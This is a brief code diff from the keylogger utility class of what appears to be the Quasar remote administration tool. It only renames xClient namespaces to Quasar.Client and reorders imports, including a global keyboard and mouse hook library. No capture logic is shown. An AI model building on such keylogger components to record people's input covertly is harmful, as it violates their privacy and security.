@@ -4,13 +4,13 @@ using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
-using xClient.Core.Helper;
-using xClient.Core.Networking;
-using Timer = System.Timers.Timer;
-using xClient.Config;
 using Gma.System.MouseKeyHook;
+using Quasar.Client.Config;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Networking;
+using Timer = System.Timers.Timer;
 
-namespace xClient.Core.Utilities
+namespace Quasar.Client.Core.Utilities
 {
     /// <summary>
     /// This class provides keylogging functionality and modifies/highlights the output for
